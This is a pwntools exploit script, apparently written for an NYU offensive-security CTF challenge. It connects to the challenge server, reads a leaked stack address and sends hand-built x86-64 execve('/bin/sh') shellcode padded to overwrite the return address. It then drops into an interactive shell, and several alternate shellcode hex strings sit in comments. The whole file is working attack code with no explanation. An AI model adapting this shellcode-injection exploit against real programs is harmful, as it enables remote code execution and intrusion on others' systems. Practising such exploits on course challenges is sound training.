from pwn import *
context(arch = 'amd64', os = 'linux')

r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1338)
r.send('bh1642\r\n')
r.recvline() # Wait
#r = process('school')
#gdb.attach(r, '''
#set follow-fork-mode child
#break *(main+74)
#continue
#''')
line = r.recvline()
log.info('Top of stack: ' + line.split(' ')[6][:-1])
rsp = int(line.split(' ')[6][:-1], 16)
log.info(rsp)
log.info(shellcraft.sh())
log.info(len(asm(shellcraft.sh())))
log.info('31c050682f2f7368682f62696e89e3505389e1b00bcd80'.decode('hex'))

#exploit = asm(shellcraft.sh()).ljust(0x20, 'A')
#exploit = '31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'.decode('hex').ljust(0x28, 'A')
exploit = shellcraft.push(0x68)
exploit += shellcraft.mov('rax', 0x732f2f2f6e69622f)
exploit += 'push rax;'
#exploit += shellcraft.mov('rdi', 'rsp')
exploit += 'mov rdi, rsp;'
#exploit += shellcraft.xor('esi', 'esi', 64)
exploit += 'xor esi, esi;'
exploit += 'push 0x3b;'
exploit += 'pop rax;'
exploit += 'cdq;'
exploit += 'syscall;'
#exploit += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)
#exploit = '6a68b800001100000050'.decode('hex').ljust(0x28, 'A')
exploit = asm(exploit).ljust(0x28, 'A')
log.info(exploit)
log.info(len(exploit))
r.send(exploit + p64(rsp) + '\r\n')
r.interactive()
